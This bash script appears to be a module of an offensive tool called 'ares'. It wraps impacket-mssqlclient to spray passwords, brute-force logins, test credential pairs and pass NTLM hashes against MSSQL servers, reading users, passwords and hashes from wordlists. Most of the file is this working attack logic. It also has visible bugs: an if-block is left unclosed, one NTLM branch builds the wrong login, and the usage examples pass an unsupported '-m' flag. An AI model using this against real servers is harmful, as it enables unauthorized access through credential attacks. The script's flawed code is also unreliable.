#!/bin/bash

# TO DO: Consider implementing multiprocessing. On success, auto terminate & print creds?

line="\n============================================================\n"
port=1433
domain=""
auth=""
mode=""
target=""
username=""
user_list=""
password=""
pass_list=""
ntlm=""
ntlm_list=""
cred_list=""
login=""

Help()
{
  cat <<EOF
[Options]
	-h: Display this help message
	-i <IP_ADDRESS>: The target server's IP Address or hostname
	-s <PORT>: The MSSQL server's port (1433 by default)
	-d <DOMAIN>: Specify the domain name or hostname (e.g., xample.local/)
	-x <MODE>: Specify the operation to perform
	-a: Detect the supported authentication method & use that method to connect

	-u <USERNAME>: The user to authenticate as
	-U <USER_LIST>: File path for a list of usernames

	-p <PASSWORD>: The password to use for authentication
	-P <PASS_LIST>: File path for a list of passwords

	-n <NTLM>: Use specified NTLM hash instead of a password
	-N <NTLM_LIST>: File path for a list of NTLM hashes (either LM:NTLM or :NTLM)

	-c <CRED_LIST>: File path for a wordlist containing colon seperated credentials (e.g., USER:PASS)

[Modes]
	spray: Spray a password or an NTLM hash against a list of usernames
	user: Test a list of passwords or NTLM hashes against a single user
	creds: Test pairs of credentials (e.g., USER:PASS)
	brute: Bruteforce usernames using a list of passwords or NTLM hashes

[Usage]

ares -m mssql -x spray -a -i 123.45.67.890 -s 8000 -d xample.local/ -U /tmp/users.txt -p 'password123!'
ares -m mssql -x brute -a -i 123.45.67.890 -U /tmp/user.txt -N /tmp/hashes.txt

EOF
  exit 0
}

Authentication()
{
  login="${domain}username:password"
  OUT=$(impacket-mssqlclient -port "$port" "${login}@${target}" 2>&1 | tr -d '\r')

  if echo "$OUT" | grep -qi "Login failed for user"; then
    echo "[+] SQL Authentication appears ENABLED"
    auth="sql"
  elif echo "$OUT" | grep -Eqi "Windows Authentication|Integrated authentication|SSPI|untrusted domain|NTLM"; then
    echo "[+] SQL Server requires WINDOWS AUTHENTICATION"
    auth="windows"
  else
    cat <<EOF
$line
[?] Unable to determine authentication mechanism automatically

[Output]

$OUT
EOF
  exit 1
  fi

  echo "[*] Authentication mechanism selected: $auth"
}

while getopts ":hi:s:d:x:au:U:p:P:n:N:c:" option; do
  case "$option" in
    h)
      Help
      ;;
    i)
      target=$OPTARG
      ;;
    d)
      domain=$OPTARG
      ;;
    s)
      port=$OPTARG
      ;;
    x)
      mode=$OPTARG
      ;;
    a)
      Authentication
      ;;
    u)
      username=$OPTARG
      ;;
    U)
      user_list=$OPTARG
      ;;
    p)
      password=$OPTARG
      ;;
    P)
      pass_list=$OPTARG
      ;;
    n)
      case "$OPTARG" in
        *:*:*)
	  echo -e "\n[-] Invalid NTLM hash format\n"
	  exit 1
	  ;;
        *:*)
          ntlm="$OPTARG"
          ;;
        *)
	  ntlm=":$OPTARG"
	  ;;
      esac
      ;;
    N)
      ntlm_list=$OPTARG
      ;;
    c)
      cred_list=$OPTARG
      ;;
    \?)
      echo -e "\nError: Invalid argument"
      exit 1
      ;;
  esac
done

if [[ -z "$target" ]]; then
  echo -e "\nEnter the MSSQL Server's IP address\n"
  read target
fi

if [[ -z "$mode" ]]; then
  cat <<EOF
Select the operation to perform

[Modes]
	spray: Spray a password or an NTLM hash against a list of usernames
	user: Test a list of passwords or NTLM hashes against a single user
	creds: Test pairs of credentials (e.g., USER:PASS)
	brute: Bruteforce usernames using a list of passwords or NTLM hashes
EOF
  read mode
fi

if [[ "$mode" == "spray" || "$mode" == "brute" ]]; then
  if [[ -z "$user_list" ]]; then
    echo -e "\nEnter the file path for your username wordlist\n"
    read user_list
  fi
fi

if [[ "$mode" == "user" || "$mode" == "brute" ]]; then
  if [[ -z "$pass_list" && -z "$ntlm_list" ]]; then
    cat <<EOF
$line
[-] No wordlist for passwords or NTLM hashes supplied. Defaulting to password authentication.

Enter the file path for your password wordlist

EOF
    read pass_list
  fi

if [[ -z "$auth" ]]; then
  cat <<EOF
$line
[!] Supported authentication method was not identified. Defaulting to WINDOWS AUTHENTICATION (-windows-auth).

This may affect reliability. Consider re-running with the -a argument.
$line
EOF
fi

case "$mode" in
  spray)
    if [[ -z "$ntlm" ]]; then

      if [[ -z "$password" ]]; then
        cat <<EOF
$line
No password or NTLM hash provided. Defaulting to password authentication.

Enter the password

EOF
        read password
      fi

      while IFS= read -r user; do
        login="$domain"
	login+="$user"
	cat <<EOF
$line
[+] Credentials: ${login}:${password}@${target}

EOF

      if [[ "$auth" == "sql" ]]; then
        impacket-mssqlclient -no-pass -port "$port" "${login}:${password}@${target}"
      else
        impacket-mssqlclient -windows-auth -no-pass -port "$port" "${login}:${password}@${target}"
      fi
    done < "$user_list"

    elif [[ -n "$ntlm" ]]; then
      while IFS= read -r user; do
        login="$domain"
        login+="$user"
        cat <<EOF
$line
[+] Credentials: ${login}@${target}
[+] Hash: $ntlm

EOF

      if [[ "$auth" == "sql" ]]; then
        impacket-mssqlclient -no-pass -port "$port" -hashes "$ntlm" "${login}@${target}"
      else
        impacket-mssqlclient -windows-auth -no-pass -port "$port" -hashes "$ntlm" "${login}@${target}"
      fi
    done <"$user_list"
    fi
    ;;

  user)
    if [[ -z "$username" ]]; then
      echo -e "\nEnter the username\n"
      read username
    fi

    login="${domain}${username}"

    if [[ -n "$pass_list" ]]; then
      while IFS= read -r pass; do
        cat <<EOF
$line
[+] Credentials: ${login}:${pass}@${target}

EOF
        if [[ "$auth" == "sql" ]]; then
	  impacket-mssqlclient -no-pass -port "$port" "${login}:${pass}@${target}"
        else
          impacket-mssqlclient -windows-auth -no-pass -port "$port" "${login}:${pass}@${target}"
	fi
      done < "$pass_list"

    elif [[ -n "$ntlm_list" ]]; then
      while IFS= read -r hash; do
        cat <<EOF
$line
[+] Credentials: ${login}@${target}
[+] Hash: $hash

EOF

        if [[ "$auth" == "sql" ]]; then
	  impacket-mssqlclient -no-pass -port "$port" -hashes "$hash" "${login}@${target}"
        else
	  impacket-mssqlclient -windows-auth -no-pass -port "$port" -hashes "$hash" "${login}:${pass}@${target}"
        fi
      done < "$ntlm_list"
    fi
    ;;

  creds)
    if [[ -z "$cred_list" ]]; then
      echo -e "\nEnter the file path for a wordlist containing colon seperated credentials (e.g., USER:PASS)\n"
      read cred_list
    fi
    while IFS= read -r creds; do
      login="${domain}${creds}"
      cat <<EOF
$line
[+] Credentials: ${login}@${target}

EOF
      if [[ "$auth" == "sql" ]]; then 
        impacket-mssqlclient -no-pass -port $port "${login}@${target}"
      else
        impacket-mssqlclient -windows-auth -no-pass -port $port "${login}@${target}"
      fi
    done < "$cred_list"
    ;;

  brute)
# Read from diff File Descriptors to prevent interference. FD 0 (stdin) & FD 3
    while IFS= read -r user; do

      if [[ -n "$pass_list" ]]; then
        while IFS= read -r pass <&3; do
	  login="${domain}${user}:${pass}"
	  cat <<EOF
$line
[+] Credentials: ${login}@${target}

EOF
	  if [[ "$auth" == "sql" ]]; then
	    impacket-mssqlclient -no-pass -port "$port" "${login}@${target}"
          else
	    impacket-mssqlclient -windows-auth -no-pass -port "$port" "${login}@${target}"
	  fi
        done 3< "$pass_list"

      elif [[ -n "$ntlm_list" ]]; then
        while IFS= read -r hash <&3; do
	  login="${domain}${user}"
	  cat <<EOF
$line
[+] Credentials: ${login}@${target}
[+] Hash: $hash

EOF
          if [[ "$auth" == "sql" ]]; then
            impacket-mssqlclient -no-pass -port "$port" -hashes "$hash" "${login}@${target}"
          else
	    impacket-mssqlclient -windows-auth -no-pass -port "$port" -hashes "$hash" "${login}@${target}"
	  fi
        done 3< "$ntlm_list"
      fi
    done < "$user_list"
    ;;

  *)
  echo -e "\nYou did not select a valid mode\n"
  Help
  ;;
esac
